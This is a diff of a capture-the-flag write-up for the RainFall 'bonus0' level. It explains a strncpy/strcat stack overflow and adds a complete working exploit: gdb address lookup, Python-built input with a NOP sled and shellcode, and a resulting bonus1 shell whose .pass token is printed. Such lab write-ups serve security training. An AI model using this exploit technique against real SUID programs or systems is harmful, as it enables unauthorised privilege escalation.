@@ -8,19 +8,22 @@ The function pp takes one parameter, which is a pointer.
 This fonction is called from main with an address that is 22 bytes above the esp of main.
 
 The function pp calls p two times:
-0x08048526      c7442404a086.  dword [src] = 0x80486a0     ; " - "
-0x0804852e      8d45d0         eax = [local_2]
-0x08048531      890424         dword [esp] = eax
-0x08048534      e87bffffff     sym.p ()
+ 8048526:	c7 44 24 04 a0 86 04 	mov    DWORD PTR [esp+0x4],0x80486a0	; " - "
+ 804852d:	08 
+ 804852e:	8d 45 d0             	lea    eax,[ebp-0x30]			; local_2
+ 8048531:	89 04 24             	mov    DWORD PTR [esp],eax
+ 8048534:	e8 7b ff ff ff       	call   80484b4 <p>
+
 which is p(&local_2, " - ");
 local_2 is located at ebp-0x30.
 then:
-0x08048539      c7442404a086.  dword [src] = 0x80486a0     ; " - "
-0x08048541      8d45e4         eax = [local_3]
-0x08048544      890424         dword [esp] = eax
-0x08048547      e868ffffff     sym.p ()
+ 8048539:	c7 44 24 04 a0 86 04 	mov    DWORD PTR [esp+0x4],0x80486a0	; " - "
+ 8048540:	08 
+ 8048541:	8d 45 e4             	lea    eax,[ebp-0x1c]				; local_3
+ 8048544:	89 04 24             	mov    DWORD PTR [esp],eax
+ 8048547:	e8 68 ff ff ff       	call   80484b4 <p>
 which is p(&local_3, " - ");
-local_1ch is located at ebp-0x1c.
+local_3 is located at ebp-0x1c.
 
 Those two buffers are 20 bytes each and are located next to each other.
 local_3 is just above local_2 (in addresses, below on the stack).
@@ -37,13 +40,48 @@ It then counts the length of the resulting string at dest by doing:
 ecx is started at 0xffffffff, being decremented at each cycle of repne scasb.
 This is a two's complement trick.
 
-It then takes the length + dest, puts two bytes ' ''\0' at the resulting address (the address poiting the \0 of dest) and does a strcat(dest, local_3);
+It then takes the length + dest, puts two bytes ' ''\0' at the resulting address (the address pointing the \0 of dest) and does a strcat(dest, local_3); This effectively shifts by one our later injected addresses.
 
 The address passed to pp by main is located at esp+22 and at the entrance of main, esp is decremented by 64, which means we must overwrite 42 bytes before overwrite the stored ebp of the function.
 
 Since the function p copies at most 20 bytes at each call, this sums up to 40 bytes. However we can make it so that the first buffer local_2 is not null terminated (as strncpy will make it if the \0 is not met before the maximum number of byte) and since it adjacent to local_3 we can copy more than 20 bytes.
 
-after adding ' ''\0' at the end of the resulting string, it appends local_3.
+After adding ' ''\0' at the end of the resulting string, it appends local_3.
 Since the read buffer of p is on the stack, and is one page big, we can store a shellcode that won't be modified much since most of this buffer is never modified except by p.
 
-So by stocking a NOP-slided shellcode on the stack and overwriting the return eip of main with an address to the NOP-slide, executing the shellcode and giving us the SUID-shell.
+So by stocking a NOP-slided shellcode on the stack and overwriting the return eip of main with an address to the NOP-slide, executing the shellcode, we get a SUID shell.
+
+We assemble our shellcode
+nasm ./ressources/shellcode.asm
+[Upload the resulting ./ressources/shellcode to the vm at /tmp] : cat ../level9/flag | clipboard ; scp -P 4242 ./ressources/shellcode bonus0@rainfall:/tmp
+
+Now we figure out the address of the read buffer:
+bonus0@RainFall:~$ gdb --args ./bonus0 "" ""
+[Removed for readability]
+(gdb) b *0x80484bd
+Breakpoint 1 at 0x80484bd
+(gdb) run
+Starting program: /home/user/bonus0/bonus0 '' ''
+
+Breakpoint 1, 0x080484bd in p ()
+(gdb) print/x $ebp-0x1008
+$1 = 0xbfffe670
+
+We construct the input file and execute the exploit: 
+
+python -c 'import sys; sys.stdout.write("A" * 4095 + "\n");' > /tmp/input # fill the first page of read, with a trailing newline so that the buffer can be null-terminated
+python -c 'import sys; sys.stdout.write("\xbf\x70\xe7\xff" * 15);' >> /tmp/input # overwrite the return eip of p with the address of the nop-slided shellcode (which is the read buffer) + some offset (256 bytes)  The address is shifted as to realign to address boundary
+python -c 'import sys; sys.stdout.write("\x90" * 2000);' >> /tmp/input # 15 * 4 = 60. The shellcode is 26 bytes long. 60 + 26 = 86. We need a trailing newline so that the buffer can be null-terminated: 86 + 1 = 87. 4096 - 87 = 4009. Therefore we can have a 4009 byte long nop-slide. We only make a 2000 byte long nop-slide because the shellcode seems to get corrupted later in the program if we put it further.
+cat /tmp/shellcode >> /tmp/input # Inject the shellcode
+echo '' >> /tmp/input # adding trailing newline
+cat /tmp/input - | ./bonus0
+
+bonus0@RainFall:~$ cat /tmp/input - | ./bonus0
+ - 
+ - 
+AAAAAAAAAAAAAAAAAAAA�p���p���p���p���p����� �p���p���p���p���p�����
+whoami
+bonus1
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
